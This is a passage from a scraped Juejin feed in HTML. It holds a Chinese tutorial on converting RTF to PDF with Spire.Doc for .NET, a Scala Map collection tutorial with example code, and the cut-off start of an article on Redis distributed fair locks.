pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>RTF（Rich Text Format）是一种通用的文档格式，允许用户在不同的文字处理软件中保存和交换格式化文本。PDF（Portable Document Format）则是一种广泛使用的文档格式，它能够保留文档的原始布局，无论在哪种设备上查看都能保持一致。因此，将 RTF 文件转换为 PDF 文件在许多应用场景中都十分重要。本文将介绍如何使用 Spire.Doc for .NET 来实现这一功能。</p>
<h2 data-id="heading-0">Spire.Doc for .NET 简介</h2>
<p>Spire.Doc 是一款 .NET 平台的组件，可以轻松地处理 Word 文档，包括创建、编辑、转换和打印文档。该组件支持多种文档格式，诸如 DOC, DOCX, RTF, HTML, TXT, PDF 等。使用 Spire.Doc，开发者可以快速实现复杂的文档操作，而无需深入了解底层文档格式。</p>
<h2 data-id="heading-1">安装 Spire.Doc</h2>
<p>要使用 Spire.Doc 进行 RTF 到 PDF 的转换，可以通过 NuGet 包管理器进行安装。以下是安装的步骤：</p>
<ol>
<li>打开 Visual Studio 并创建一个新项目（例如，控制台应用程序）。</li>
<li>右键单击项目，选择“管理 NuGet 包”。</li>
<li>在浏览选项卡中，搜索“Spire.Doc”，并点击“安装”以添加该库。</li>
</ol>
<h2 data-id="heading-2">代码示例</h2>
<p>以下是一个简单的代码示例，演示如何使用 Spire.Doc 将 RTF 文件转换为 PDF 文件：</p>
<pre><code class="hljs language-typescript" lang="typescript">using <span class="hljs-title class_">Spire</span>.<span class="hljs-property">Doc</span>;
using <span class="hljs-title class_">Spire</span>.<span class="hljs-property">Doc</span>.<span class="hljs-property">Documents</span>;

classProgram
{
<span class="hljs-title function_">staticvoidMain</span>(<span class="hljs-params"><span class="hljs-built_in">string</span>[] args</span>)
    {
    <span class="hljs-comment">// 创建一个 Document 对象</span>
        <span class="hljs-title class_">Document</span> <span class="hljs-variable language_">document</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Document</span>();

    <span class="hljs-comment">// 加载 RTF 文件</span>
        <span class="hljs-variable language_">document</span>.<span class="hljs-title class_">LoadFromFile</span>(<span class="hljs-string">"input.rtf"</span>);

    <span class="hljs-comment">// 保存为 PDF 文件</span>
        <span class="hljs-variable language_">document</span>.<span class="hljs-title class_">SaveToFile</span>(<span class="hljs-string">"output.pdf"</span>, <span class="hljs-title class_">FileFormat</span>.<span class="hljs-property">PDF</span>);

    <span class="hljs-comment">// 输出成功信息</span>
        <span class="hljs-title class_">Console</span>.<span class="hljs-title class_">WriteLine</span>(<span class="hljs-string">"RTF 文件成功转换为 PDF 文件！"</span>);
    }
}
</code></pre>
<h3 data-id="heading-3">代码详解</h3>
<ol>
<li><strong>加载 RTF 文件</strong> ：使用 <code>document.LoadFromFile()</code> 方法加载指定路径的 RTF 文件。</li>
<li><strong>保存为 PDF 文件</strong> ：通过 <code>document.SaveToFile()</code> 方法，将加载的文档保存为 PDF 格式。此方法的第一个参数是输出文件的路径，第二个参数则是文件格式。</li>
<li><strong>输出成功信息</strong> ：控制台输出信息提示用户转换成功。</li>
</ol>
<h2 data-id="heading-4">处理异常</h2>
<p>在实际开发中，处理异常是非常重要的。下面的示例展示了如何添加异常处理：</p>
<p>csharp</p>
<pre><code class="hljs language-typescript" lang="typescript">using <span class="hljs-title class_">System</span>;
using <span class="hljs-title class_">Spire</span>.<span class="hljs-property">Doc</span>;

classProgram
{
<span class="hljs-title function_">staticvoidMain</span>(<span class="hljs-params"><span class="hljs-built_in">string</span>[] args</span>)
    {
<span class="hljs-keyword">try</span>
        {
        <span class="hljs-comment">// 创建 Document 对象</span>
            <span class="hljs-title class_">Document</span> <span class="hljs-variable language_">document</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Document</span>();
            <span class="hljs-comment">// 加载 RTF 文件</span>
            <span class="hljs-variable language_">document</span>.<span class="hljs-title class_">LoadFromFile</span>(<span class="hljs-string">"input.rtf"</span>);
            <span class="hljs-comment">// 保存为 PDF 文件</span>
            <span class="hljs-variable language_">document</span>.<span class="hljs-title class_">SaveToFile</span>(<span class="hljs-string">"output.pdf"</span>, <span class="hljs-title class_">FileFormat</span>.<span class="hljs-property">PDF</span>);
            <span class="hljs-title class_">Console</span>.<span class="hljs-title class_">WriteLine</span>(<span class="hljs-string">"RTF 文件成功转换为 PDF 文件！"</span>);
        }
        <span class="hljs-keyword">catch</span> (<span class="hljs-title class_">Exception</span> ex)
        {
            <span class="hljs-title class_">Console</span>.<span class="hljs-title class_">WriteLine</span>($<span class="hljs-string">"发生错误：{ex.Message}"</span>);
        }
    }
}
</code></pre>
<p>通过抛出异常，用户可以确认文件路径是否正确或是否存在其他问题。</p>
<h2 data-id="heading-5">总结</h2>
<p>使用 Spire.Doc for .NET 转换 RTF 文件为 PDF 文件非常简单，只需几行代码即可完成。通过加载 RTF 文件并将其保存为 PDF，开发者能够在自己的应用程序中轻松实现文档处理功能。此外，通过适当的异常处理，可以增强程序的健壮性，使得用户体验更佳。</p>
<p>这种文档转换在实际应用中具有广泛的应用场景，如报告生成、数据导出和文档共享等。无论是业务应用还是学术需求，掌握这种技能都是现代开发者不可或缺的能力。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Scala Map集合完全指南：从入门到实战应用]]></title>    <link>https://juejin.cn/post/7576978338754740274</link>    <guid>https://juejin.cn/post/7576978338754740274</guid>    <pubDate>2025-11-27T06:25:19.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7576978338754740274" data-draft-id="7576867727718547491" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Scala Map集合完全指南：从入门到实战应用"/> <meta itemprop="keywords" content="Scala,后端,编程语言"/> <meta itemprop="datePublished" content="2025-11-27T06:25:19.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="今天没有盐"/> <meta itemprop="url" content="https://juejin.cn/user/1408937846645355"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Scala Map集合完全指南：从入门到实战应用
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1408937846645355/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    今天没有盐
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-27T06:25:19.000Z" title="Thu Nov 27 2025 06:25:19 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-27
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">导入</h2>
<p>在 Scala 中，集合体系与 Python 不同：没有直接名为 Set 的需导入基础类——Set 是 Scala 标准库的核心集合（位于 scala.collection 包下），默认无需手动导入即可使用。但需注意 Scala 的 Set 分为不可变（默认）和可变两种。本文将具体从格式定义到常见操作来讲述集合 Set。</p>
<h2 data-id="heading-1">一、Map的定义和创建</h2>
<h3 data-id="heading-2">定义</h3>
<p>Map（映射）是Scala中一种存储键值对（key-value）的数据结构，每个键在Map中是唯一的，通过键可以快速查找到对应的值。</p>
<h3 data-id="heading-3">好处</h3>
<ul>
<li><strong>快速查找</strong>：通过键可以在常数时间内访问对应的值</li>
<li><strong>数据关联</strong>：能够建立有逻辑关联的数据结构</li>
<li><strong>类型安全</strong>：编译时检查键值类型</li>
<li><strong>灵活性</strong>：支持可变和不可变两种实现方式</li>
</ul>
<h3 data-id="heading-4">语法</h3>
<pre><code class="hljs language-scala" lang="scala"><span class="hljs-comment">// 不可变Map</span>
<span class="hljs-keyword">val</span> mapName: <span class="hljs-type">Map</span>[<span class="hljs-type">KeyType</span>, <span class="hljs-type">ValueType</span>] = <span class="hljs-type">Map</span>(key1 -&gt; value1, key2 -&gt; value2,...)

<span class="hljs-comment">// 可变Map (需导入scala.collection.mutable.Map)</span>
<span class="hljs-keyword">val</span> mapName: mutable.<span class="hljs-type">Map</span>[<span class="hljs-type">KeyType</span>, <span class="hljs-type">ValueType</span>] = mutable.<span class="hljs-type">Map</span>(key1 -&gt; value2,...)
</code></pre>
<h2 data-id="heading-5">二、Map的基本操作</h2>
<h3 data-id="heading-6">案例一：可变Map与不可变Map的基本操作</h3>
<h4 data-id="heading-7">代码</h4>
<pre><code class="hljs language-scala" lang="scala"><span class="hljs-keyword">package</span> map

<span class="hljs-comment">/*
 * Map，映射，表示一种一一对应关系！
 */</span>
<span class="hljs-class"><span class="hljs-keyword">object</span> <span class="hljs-title">map01</span> </span>{
  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span></span>(args: <span class="hljs-type">Array</span>[<span class="hljs-type">String</span>]): <span class="hljs-type">Unit</span> = {
    <span class="hljs-comment">// 创建可变的Map 键 值 对</span>
    <span class="hljs-keyword">val</span> scores = scala.collection.mutable.<span class="hljs-type">Map</span>(<span class="hljs-string">"alice"</span> -&gt; <span class="hljs-number">90</span>, <span class="hljs-string">"bob"</span> -&gt; <span class="hljs-number">85</span>)
    <span class="hljs-comment">// 添加</span>
    scores += (<span class="hljs-string">"max"</span> -&gt; <span class="hljs-number">100</span>)

    println(scores)

    <span class="hljs-comment">// 创建不可变的Map</span>
    <span class="hljs-keyword">val</span> provinceInfo = scala.collection.immutable.<span class="hljs-type">Map</span>(<span class="hljs-string">"42"</span> -&gt; <span class="hljs-string">"湖北"</span>)
    <span class="hljs-comment">// provinceInfo += ("14" -&gt; "山西")</span>
    <span class="hljs-keyword">val</span> newInfo = provinceInfo + (<span class="hljs-string">"14"</span> -&gt; <span class="hljs-string">"山西"</span>)
    println(newInfo)
  }
}
</code></pre>
<h4 data-id="heading-8">结果展示</h4>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f86952315ed6480786f8e47076e74b4d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LuK5aSp5rKh5pyJ55uQ:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764829518&amp;x-signature=m6QMYs2YgcY5k%2BN899H6fpOJ0Zk%3D" alt="01.png" loading="lazy"/></p>
<h4 data-id="heading-9">代码分析</h4>
<ol>
<li><strong>可变Map创建</strong>：使用<code>scala.collection.mutable.Map</code>创建可变Map，初始包含"alice"和"bob"的成绩</li>
<li><strong>添加操作</strong>：使用<code>+=</code>操作符直接向可变Map添加"max"的成绩，这会修改原Map</li>
<li><strong>不可变Map创建</strong>：使用<code>scala.collection.immutable.Map</code>创建不可变Map</li>
<li><strong>不可变Map添加</strong>：通过<code>+</code>操作符创建新的Map，原Map保持不变，体现了不可变集合的特性</li>
<li><strong>键值对语法</strong>：使用<code>-&gt;</code>操作符创建键值对，语法清晰直观</li>
</ol>
<h3 data-id="heading-10">案例二：Map的增删改查操作</h3>
<h4 data-id="heading-11">代码</h4>
<pre><code class="hljs language-scala" lang="scala"><span class="hljs-keyword">package</span> map
<span class="hljs-number">9</span>
<span class="hljs-comment">/*
*
* Map, 映射，表示一种一一对应关系
* 1. 添加
* 2. 删除
* 3. 查询，对应的值
* 4. 遍历，把所有的数据，依次访问
* */</span>
<span class="hljs-class"><span class="hljs-keyword">object</span> <span class="hljs-title">map02</span> </span>{
  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span></span>(args: <span class="hljs-type">Array</span>[<span class="hljs-type">String</span>]): <span class="hljs-type">Unit</span> = {
    <span class="hljs-comment">// 创建可变的Map  键  值  对</span>
    <span class="hljs-keyword">val</span> scores = scala.collection.mutable.<span class="hljs-type">Map</span>(<span class="hljs-string">"alice"</span> -&gt; <span class="hljs-number">90</span>, <span class="hljs-string">"bob1"</span> -&gt; <span class="hljs-number">85</span>)
    <span class="hljs-comment">// 1. 添加</span>
    scores += (<span class="hljs-string">"map"</span> -&gt; <span class="hljs-number">100</span>)

    <span class="hljs-comment">// 2. 删除 alice。 删除操作是根据key来做的</span>
    scores -= <span class="hljs-string">"alice"</span>

    <span class="hljs-comment">// 3. 查询。查看bob的分数. rst 是一个Option类型</span>
    <span class="hljs-keyword">val</span> rst = scores.get(<span class="hljs-string">"bob1"</span>)
    <span class="hljs-keyword">if</span> (rst.isEmpty){
      println(<span class="hljs-string">"bob1没有成绩"</span>)
    } <span class="hljs-keyword">else</span> {
      println(rst.get)
    }
    <span class="hljs-comment">// 4. 打印scores</span>
    println(scores)
    <span class="hljs-comment">// 第二种方法 for</span>
    <span class="hljs-keyword">for</span> ((key,value) &lt;- scores){
      println(<span class="hljs-string">s"<span class="hljs-subst">${key}</span>, <span class="hljs-subst">${value}</span>分"</span>)
    }

    <span class="hljs-comment">// 第二种方法 foreach</span>
    scores.foreach({
      <span class="hljs-keyword">case</span> (key,value) =&gt; println(<span class="hljs-string">s"<span class="hljs-subst">${key}</span>, <span class="hljs-subst">${value}</span>分"</span>)
    })
  }
}
</code></pre>
<h4 data-id="heading-12">结果展示</h4>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0c02ec9a43914cc1b3f9bd4e3001fcef~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LuK5aSp5rKh5pyJ55uQ:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764829518&amp;x-signature=mwXGkiXbHfGa%2BeEjBeBzNPnDC5s%3D" alt="02.png" loading="lazy"/></p>
<h4 data-id="heading-13">代码分析</h4>
<ol>
<li><strong>添加元素</strong>：使用<code>+=</code>操作符添加新的键值对"map" -&gt; 100</li>
<li><strong>删除元素</strong>：使用<code>-=</code>操作符根据键删除"alice"对应的条目</li>
<li><strong>查询元素</strong>：
<ul>
<li>使用<code>get</code>方法查询，返回<code>Option</code>类型，安全处理可能不存在的键</li>
<li>通过<code>isEmpty</code>判断是否存在，避免空指针异常</li>
<li>使用<code>get</code>方法从<code>Option</code>中提取实际值</li>
</ul>
</li>
<li><strong>遍历方式一</strong>：使用<code>for</code>循环配合模式匹配，直接解构键值对</li>
<li><strong>遍历方式二</strong>：使用<code>foreach</code>方法配合case语句，函数式风格遍历</li>
<li><strong>输出格式</strong>：使用字符串插值<code>s"${key}, ${value}分"</code>格式化输出</li>
</ol>
<h2 data-id="heading-14">三、Map的常用方法详解</h2>
<h3 data-id="heading-15">添加元素</h3>
<p><strong>可变Map</strong>：</p>
<ul>
<li><code>+=</code>操作符：<code>map += (key -&gt; value)</code></li>
<li><code>put</code>方法：<code>map.put(key, value)</code></li>
</ul>
<p><strong>不可变Map</strong>：</p>
<ul>
<li><code>+</code>操作符：<code>val newMapName: Map[KeyType, ValueType] = oldMapName + (newKey -&gt;newValue)</code>（创建新Map）</li>
</ul>
<h3 data-id="heading-16">查询元素</h3>
<ul>
<li><code>get</code>方法：<code>val valueOption: Option[ValueType] = mapName.get(key)</code> ，返回<code>Option[ValueType]</code>，安全查询</li>
<li>直接访问：<code>map(key)</code>，键不存在时抛出异常</li>
</ul>
<h3 data-id="heading-17">删除元素（仅可变Map）</h3>
<ul>
<li><code>-=</code>操作符：<code>mapName -= key</code></li>
<li><code>remove</code>方法：<code>mapName.remove(key)</code></li>
</ul>
<h3 data-id="heading-18">遍历Map</h3>
<pre><code class="hljs language-scala" lang="scala"><span class="hljs-comment">// for循环遍历</span>
<span class="hljs-keyword">for</span> ((key, value) &lt;- map) {
    println(<span class="hljs-string">s"<span class="hljs-subst">$key</span>: <span class="hljs-subst">$value</span>"</span>)
}

<span class="hljs-comment">// foreach方法遍历</span>
map.foreach { <span class="hljs-keyword">case</span> (key, value) =&gt;
    println(<span class="hljs-string">s"<span class="hljs-subst">$key</span>: <span class="hljs-subst">$value</span>"</span>)
}
</code></pre>
<h2 data-id="heading-19">四、总结</h2>
<p>通过本篇文章的学习，我们全面掌握了Scala中Map集合的核心知识：</p>
<h3 data-id="heading-20">核心要点</h3>
<ol>
<li><strong>两种Map类型</strong>：可变Map允许原地修改，不可变Map操作后返回新集合</li>
<li><strong>安全查询</strong>：使用<code>get</code>方法配合<code>Option</code>类型避免运行时异常</li>
<li><strong>多种遍历</strong>：支持<code>for</code>循环和<code>foreach</code>两种遍历方式</li>
<li><strong>丰富操作</strong>：提供完整的增删改查API</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[基于redis的多资源分布式公平锁的设计与实践]]></title>    <link>https://juejin.cn/post/7576955345379115071</link>    <guid>https://juejin.cn/post/7576955345379115071</guid>    <pubDate>2025-11-27T06:50:34.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7576955345379115071" data-draft-id="7576955345379098687" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="基于redis的多资源分布式公平锁的设计与实践"/> <meta itemprop="keywords" content="后端,Redis"/> <meta itemprop="datePublished" content="2025-11-27T06:50:34.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="海尔智慧家技术平台"/> <meta itemprop="url" content="https://juejin.cn/user/3848721122725016"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            基于redis的多资源分布式公平锁的设计与实践
            <!----> <!----></h1> <div class="container team-follow" data-v-d326b38e="" data-v-61fb5e44=""><div class="left" data-v-d326b38e=""><a href="/team/7156434854350389283/posts" data-v-d326b38e=""><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/a4176c1a2e0b4e1b986f105126840cc9~tplv-k3u1fbpfcp-watermark.image?" class="icon" data-v-d326b38e=""/></a> <div class="content" data-v-d326b38e=""><div style="display: flex" data-v-d326b38e=""><a href="/team/7156434854350389283/posts" data-v-d326b38e=""><p class="title-line" data-v-d326b38e=""><span title="三翼鸟数字化技术团队" class="title" data-v-d326b38e="">三翼鸟数字化技术团队</span> <img src="//lf-web-assets.juejin.cn/obj/juejin-web/xitu_juejin_web/255e400027b783cbad76dc41527e7695.svg" alt="team icon" class="team-icon" data-v-d326b38e=""/></p></a></div> <div class="meta-box team" data-v-d326b38e="" data-v-61fb5e44=""><time datetime="2025-11-27T06:50:34.000Z" title="Thu Nov 27 2025 06:50:34 GMT+0000 (Coordinated Universal Time)" class="time" data-v-d326b38e="" data-v-61fb5e44="">
                2025-11-27
              </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-d326b38e="" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-d326b38e="" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-d326b38e="" data-v-61fb5e44=""/></svg> <span class="views-count" style="display:none;" data-v-d326b38e="" data-v-61fb5e44="">
                0
              </span> <span class="read-time" data-v-d326b38e="" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-d326b38e="" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-d326b38e="" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-d326b38e="" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-d326b38e="" data-v-61fb5e44=""/></svg>
                阅读8分钟
              </span> <!----> <!----></div></div></div> <button class="jj-follow-button follow-btn" style="display:none;" data-v-b60b2868="" data-v-d326b38e=""><span data-v-b60b2868="" data-v-d326b38e=""><i class="byte-icon byte-icon--plus" data-v-d326b38e=""><svg xmlns="http://www.w3.org/2000/svg" viewbox="0 0 48 48"><path fill="none" d="M0 0h48v48H0z"/><path d="M24.7 4c.4 0 .6 0 .8.1.2.1.3.2.4.4.1.2.1.3.1.8V22h16.7c.4 0 .6 0 .8.1.2.1.3.2.4.4.1.2.1.3.1.8v1.4c0 .4 0 .6-.1.8-.1.2-.2.3-.4.4-.2.1-.3.1-.8.1H26v16.7c0 .4 0 .6-.1.8-.1.2-.2.3-.4.4-.2.1-.3.1-.8.1h-1.4c-.4 0-.6 0-.8-.1-.2-.1-.3-.2-.4-.4-.1-.2-.1-.3-.1-.8V26H5.3c-.4 0-.6 0-.8-.1-.2-.1-.3-.2-.4-.4-.1-.2-.1-.3-.1-.8v-1.4c0-.4 0-.6.1-.8.1-.2.2-.3.4-.4.2-.1.3-.1.8-.1H22V5.3c0-.4 0-.6.1-.8.1-.2.2-.3.4-.4.2-.1.3-.1.8-.1h1.4z"/></svg></i>
        关注
      </span></button></div> <div class="team-user block-hidden" data-v-61fb5e44=""><div class="avatar jj-avatar avatar" data-v-03256cc6="" data-v-61fb5e44=""><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADwAAAA8AQMAAAAAMksxAAAAA1BMVEUAAACnej3aAAAAAXRSTlMAQObYZgAAAA5JREFUKM9jGAWjAAcAAAIcAAE27nY6AAAAAElFTkSuQmCC" alt="avatar" class="lazy avatar-img" data-v-5244ef91="" data-v-03256cc6=""/> </div> <!----> <span class="position ellipsis" data-v-61fb5e44="">
              @海尔优家智能科技（北京）有限公司
            </span></div> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body 